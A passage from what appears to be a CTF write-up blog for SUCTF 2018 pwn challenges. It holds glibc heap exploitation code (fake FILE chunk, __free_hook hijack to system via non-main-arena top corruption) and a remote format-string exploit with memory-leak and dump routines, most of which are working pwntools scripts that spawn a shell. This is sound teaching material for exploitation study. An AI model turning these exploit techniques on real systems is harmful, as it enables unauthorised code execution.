class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">sys_addr = libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">malloc_hook = libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">io_list_all = libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">binsh_addr = libc_base+next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">log.info(<span class="string">'sys_addr:%#x'</span> %sys_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake chunk</span></span><br><span class="line">fake_chunk = p64(<span class="number">0x8002</span>)+p64(<span class="number">0x61</span>) <span class="comment">#header</span></span><br><span class="line">fake_chunk += p64(<span class="number">0xddaa</span>)+p64(io_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x2</span>)+p64(<span class="number">0xffffffffffffff</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> +p64((binsh_addr<span class="number">-0x64</span>)/<span class="number">2</span>)</span><br><span class="line">fake_chunk = fake_chunk.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_chunk += p64(sys_addr+<span class="number">0x420</span>)</span><br><span class="line">fake_chunk = fake_chunk.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">vtable_addr = malloc_hook<span class="number">-13872</span><span class="comment">#+libc.symbols['_IO_str_jumps']</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">16</span> +fake_chunk</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(vtable_addr)</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">3</span>) </span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># vtable</span></span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line">add(<span class="number">16</span>,payload)<span class="comment">#3</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x200</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="noend"><a href="#noend" class="headerlink" title="noend"></a>noend</h1><p>这道题涉及的主要是非主分配区的分配方式，相关知识、代码分析和调试方法在之前的<a href="http://p4nda.top/2018/03/15/n1ctf2018/">N1CTF PWN题记录</a> 中提到过。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞存在于main函数中，对于malloc得到的指针，没有检验是否为0，就对size-1的位置写一个0，可以造成一字节的内存任意写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="built_in">malloc</span>(size);</span><br><span class="line">read(<span class="number">0</span>, buf, size);</span><br><span class="line">*((_BYTE *)buf + size - <span class="number">1</span>) = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>但是想要malloc返回为0，需要申请一个巨大的内存块大小，使得正常的main_arena无法处理，在_libc_malloc中有该部分的函数逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br></pre></td></tr></table></figure><p>可以看到，在主分配区返回为空时，会初始化一个非主分配区，即<strong><em>ar_ptr = arena_get_retry (ar_ptr, bytes);</em></strong> ，而在此后，均会使用该非主分配区，而assert断言是在debug模式下起作用的，所以当两个分配区都无法处理时，就会返回一个空指针，造成任意写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">arena_get_retry (mstate ar_ptr, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  LIBC_PROBE (memory_arena_retry, <span class="number">2</span>, bytes, ar_ptr);</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != &amp;main_arena)</span><br><span class="line">    &#123;</span><br><span class="line">      (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line">      <span class="comment">/* Don't touch the main arena if it is corrupt.  */</span></span><br><span class="line">      <span class="keyword">if</span> (arena_is_corrupt (&amp;main_arena))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      ar_ptr = &amp;main_arena;</span><br><span class="line">      (<span class="keyword">void</span>) mutex_lock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line">      ar_ptr = arena_get2 (bytes, ar_ptr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ar_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞利用分为地址泄露和地址劫持两部分。</p><h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>在主分配区和非主分配区里，其实质上的内存分配方式是一样的。由于题目限制，申请内存小于等于0x7f时都会释放，而大于时不会释放。</p><p>可以首先分配多个不同大小的fastbin大小的块，会释放并挂到fastbin链中去，再申请一个大块（大于0x78，小于等于0x7f），此时，这个块获取的应该为0x90大小，而释放时会与top合并。合并之后，会触发malloc_consolidate，触发后，fastbin中的较小的堆块由于不和top相连，因此会放到unsorted_bin中一次，最后全部合并后与top合并，造成，top中有部分包含main_arena+88或thread_arena+88的地址，可以再次分配回来造成地址泄露。</p><h3 id="劫持执行流"><a href="#劫持执行流" class="headerlink" title="劫持执行流"></a>劫持执行流</h3><p>在非主分配区中，同样利用内存任意写，对thread<em>arena中保存的top末位地址写0，可使top错位，其中size会落到可以控制的堆块地址中，可通过构造size大小使得可以分配到libc的地址中，劫持\</em>_free_hook为system。具体方法是将堆块分配到__free_hook之前，通过top的性质，将被误作为下一块size的__free_hook写为system+1的地址（需要构造提到的top size），虽然是system+1，但对整体没有影响。因为system的前五条指令是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /5i system</span><br><span class="line">   0x7fdf2f15c6a0 &lt;__libc_system&gt;:test   rdi,rdi</span><br><span class="line">   0x7fdf2f15c6a3 &lt;__libc_system+3&gt;:je     0x7fdf2f15c6b0 &lt;__libc_system+16&gt;</span><br><span class="line">   0x7fdf2f15c6a5 &lt;__libc_system+5&gt;:jmp    0x7fdf2f15c130 &lt;do_system&gt;</span><br><span class="line">   0x7fdf2f15c6aa &lt;__libc_system+10&gt;:nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x7fdf2f15c6b0 &lt;__libc_system+16&gt;:lea    rdi,[rip+0x145591]        # 0x7fdf2f2a1c48</span><br></pre></td></tr></table></figure><p>system+1的前五条指令是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /5i system+1</span><br><span class="line">   0x7fdf2f15c6a1 &lt;__libc_system+1&gt;:test   edi,edi</span><br><span class="line">   0x7fdf2f15c6a3 &lt;__libc_system+3&gt;:je     0x7fdf2f15c6b0 &lt;__libc_system+16&gt;</span><br><span class="line">   0x7fdf2f15c6a5 &lt;__libc_system+5&gt;:jmp    0x7fdf2f15c130 &lt;do_system&gt;</span><br><span class="line">   0x7fdf2f15c6aa &lt;__libc_system+10&gt;:nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x7fdf2f15c6b0 &lt;__libc_system+16&gt;:lea    rdi,[rip+0x145591]        # 0x7fdf2f2a1c48</span><br></pre></td></tr></table></figure><p>可以发现并没有执行上的影响，再次申请一个小堆块（小于0x50），并在其中写上’/bin/sh\0’就可以拿到shell。</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./noend'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./noend'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'c'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendline(str(size))</span><br><span class="line">time.sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(content)</span><br><span class="line">k = p.recvline()</span><br><span class="line"><span class="keyword">return</span> k</span><br><span class="line">build(<span class="number">0x28</span>,<span class="string">'1'</span>*<span class="number">8</span>)</span><br><span class="line">build(<span class="number">0x38</span>,<span class="string">'2'</span>*<span class="number">8</span>)</span><br><span class="line">build(<span class="number">0x7f</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">k = build(<span class="number">0x38</span>,<span class="string">'d'</span>*<span class="number">8</span>) <span class="comment">#泄露地址</span></span><br><span class="line">libc.address = u64(k[<span class="number">8</span>:<span class="number">8</span>+<span class="number">8</span>]) - <span class="number">0x10</span> - <span class="number">88</span> -libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system : '</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.sendline((str( <span class="number">0x10</span> + <span class="number">87</span> + libc.symbols[<span class="string">'__malloc_hook'</span>]))) <span class="comment"># 切换到非主分配区</span></span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line">build(<span class="number">0x38</span>,<span class="string">'A'</span>*<span class="number">8</span>)</span><br><span class="line">p.clean()</span><br><span class="line">build(<span class="number">0x28</span>,<span class="string">'1'</span>*<span class="number">8</span>)</span><br><span class="line">build(<span class="number">0x48</span>,<span class="string">'2'</span>*<span class="number">8</span>)</span><br><span class="line">build(<span class="number">0x7f</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">k = build(<span class="number">0x38</span>,<span class="string">'d'</span>*<span class="number">8</span>)</span><br><span class="line">thread_arena_addr_top = u64(k[<span class="number">8</span>:<span class="number">8</span>+<span class="number">8</span>])<span class="comment">#泄露非主分配区地址</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] thread_arena_addr  : '</span>,hex(thread_arena_addr_top)</span><br><span class="line">target = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">build(<span class="number">0xf0</span>,p64(target + (libc.symbols[<span class="string">'__free_hook'</span>] - thread_arena_addr_top +<span class="number">0x70</span><span class="number">-0x900</span> ) )*(<span class="number">0xf0</span>/<span class="number">8</span>))<span class="comment">#布置fake top size</span></span><br><span class="line">p.sendline(str(thread_arena_addr_top+<span class="number">1</span>))<span class="comment">#对thread_arena中的top值写末尾一字节</span></span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.clean()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">build(libc.symbols[<span class="string">'__free_hook'</span>]-(thread_arena_addr_top<span class="number">-0x78</span>+<span class="number">0x900</span>)<span class="number">-0x18</span>,p64(libc.symbols[<span class="string">'system'</span>]))<span class="comment">#将__free_hook劫持为system+1</span></span><br><span class="line">build(<span class="number">0x10</span>,<span class="string">'/bin/sh\0'</span>)<span class="comment">#free后拿到shell</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h2><p>对于非主分配区程序的调试，我找到一种相对于简单的方法。</p><p>首先利用vmmap指令，找到非主分配区的mmap块位置：</p><p><img src="/img/SUCTF2018/2-1.png" alt=""></p><p>红框中标记的是堆和非主分配区的地址，二者应该是一样大的。</p><p>当找到非主分配区地址后，根据libc源码，其中第一块申请的应该是_heap_info结构体，因此，可以看到该结构体内容：</p><p><img src="/img/SUCTF2018/2-2.png" alt=""></p><p>而在该结构体内，其中第一个成员ar_ptr指向的就是非主分配区的arena结构体，与main_arena的结构体是一致的。</p><p><img src="/img/SUCTF2018/2-3.png" alt=""></p><p>注意，在一个thread_arena中仅有一个malloc_state结构体，位于第一个申请的内存块中。</p><h1 id="lock2"><a href="#lock2" class="headerlink" title="lock2"></a>lock2</h1><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(offset)</span>:</span></span><br><span class="line">    <span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line">    p = remote(<span class="string">'pwn.suctf.asuri.org'</span>, <span class="number">20001</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'password'</span>)</span><br><span class="line">    p.sendline(<span class="string">'123456'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_format</span><span class="params">(start, length)</span>:</span></span><br><span class="line">        out = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(start, start + length):</span><br><span class="line">            out += <span class="string">'-%%%d$p'</span> % i</span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">    <span class="comment"># for i in range(20):</span></span><br><span class="line">    <span class="comment">#     p.recvuntil('cmd:')</span></span><br><span class="line">    <span class="comment">#     format_string = leak_format(2 + 4*i, 4)</span></span><br><span class="line">    <span class="comment">#     p.sendline(format_string)</span></span><br><span class="line">    <span class="comment">#     print p.recvline()</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_cmd</span><span class="params">(p, cmd)</span>:</span></span><br><span class="line">        p.recvuntil(<span class="string">'cmd:'</span>)</span><br><span class="line">        p.sendline(cmd)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span><span class="params">(p, index)</span>:</span></span><br><span class="line">        p.recvuntil(<span class="string">'cmd:'</span>)</span><br><span class="line">        p.sendline(<span class="string">"%%%d$pAAA"</span> % index)</span><br><span class="line">        p.recvuntil(<span class="string">'cmd:'</span>)</span><br><span class="line">        <span class="keyword">return</span> int(p.recvuntil(<span class="string">'AAA'</span>, drop=<span class="keyword">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_mem</span><span class="params">(p, addr)</span>:</span></span><br><span class="line">        buf = <span class="string">'%7$s'</span> + <span class="string">'=--='</span> + p64(addr) + <span class="string">'bb'</span> </span><br><span class="line">        run_cmd(p, buf)</span><br><span class="line">        p.recvuntil(<span class="string">'cmd:'</span>)</span><br><span class="line">        <span class="keyword">return</span> p.recvuntil(<span class="string">'=--='</span>, drop=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_mem</span><span class="params">(p, addr, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> value != <span class="number">0</span>:</span><br><span class="line">            buf = (<span class="string">'%%%dc%%7$hn'</span> % value).ljust(<span class="number">8</span>, <span class="string">'='</span>) + p64(addr) + <span class="string">'bb'</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            buf = <span class="string">'%%7$hn'</span>.ljust(<span class="number">8</span>, <span class="string">'='</span>) + p64(addr) + <span class="string">'bb'</span> </span><br><span class="line"></span><br><span class="line">        run_cmd(p, buf)</span><br><span class="line">        p.recvuntil(<span class="string">'cmd:'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_codebase</span><span class="params">(p)</span>:</span></span><br><span class="line">        code_base = leak_stack(p, <span class="number">16</span>) &amp; (~<span class="number">0xfff</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">print</span> hex(code_base)</span><br><span class="line">            data = leak_mem(p, code_base)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'ELF'</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">print</span> data</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                code_base -= <span class="number">0x1000</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'code_base is '</span> + hex(code_base)</span><br><span class="line">        <span class="keyword">return</span> code_base</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumpmem</span><span class="params">(offset, length)</span>:</span></span><br><span class="line">        p = remote(<span class="string">'pwn.suctf.asuri.org'</span>, <span class="number">20001</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'password'</span>)</span><br><span class="line">        p.sendline(<span class="string">'123456'</span>)</span><br><span class="line">        </span><br><span class="line">        code_base = get_codebase(p)</span><br><span class="line"></span><br><span class="line">        dump = <span class="string">''</span></span><br><span class="line">        addr = code_base + offset</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> len(dump) &lt; length:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'\x0a'</span> <span class="keyword">in</span> p64(addr):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'bad addr'</span>, hex(addr)</span><br><span class="line">                addr += <span class="number">1</span></span><br><span class="line">                dump += <span class="string">'\x00'</span></span><br><span class="line">        </span><br><span class="line">            data = leak_mem(p, addr)</span><br><span class="line">            data += <span class="string">'\x00'</span></span><br><span class="line">            dump += data</span><br><span class="line">            addr += len(data)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">print</span> hex(addr)</span><br><span class="line">            <span class="keyword">if</span> count % <span class="number">200</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> dump.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> dump</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumpelf</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">            dumpfile = <span class="string">'dump%02d'</span> % i</span><br><span class="line">            <span class="keyword">if</span> os.path.exists(dumpfile):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'dumpfile %s exists'</span> % dumpfile</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            size = <span class="number">0x400</span></span><br><span class="line">            dump = dumpmem(i*size, size)[:size]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'dump length is '</span>, len(dump)</span><br><span class="line">            open(dumpfile, <span class="string">'wb'</span>).write(dump)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># dumpelf()</span></span><br><span class="line">    <span class="comment"># for i in range(2, 20):</span></span><br><span class="line">    <span class="comment">#     try:</span></span><br><span class="line">    <span class="comment">#         print i, hex(leak_stack(i))</span></span><br><span class="line">    <span class="comment">#     except Exception as e:</span></span><br><span class="line">    <span class="comment">#         print e</span></span><br><span class="line"></span><br><span class="line">    canary = leak_stack(p, <span class="number">15</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'canary is '</span>, hex(canary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'K  '</span>)</span><br><span class="line">    addr = int(p.recvuntil(<span class="string">'--'</span>, drop=<span class="keyword">True</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_byte</span><span class="params">(byte)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> byte &gt;&gt; i == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            bit = (byte &gt;&gt; i) &amp; <span class="number">1</span></span><br><span class="line">            write_mem(p, addr + i*<span class="number">4</span>, bit)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># for i in range(34, 256):</span></span><br><span class="line">    <span class="comment">#     print i</span></span><br><span class="line">    <span class="comment">#     write_byte(i)    </span></span><br><span class="line">    <span class="comment">#     print p.recvline_contains('lock')</span></span><br><span class="line"></span><br><span class="line">    write_byte(<span class="number">35</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Box:'</span>)</span><br><span class="line">    func_flag = int(p.recvline().strip(<span class="string">'\n'</span>), <span class="number">16</span>)</span><br><span 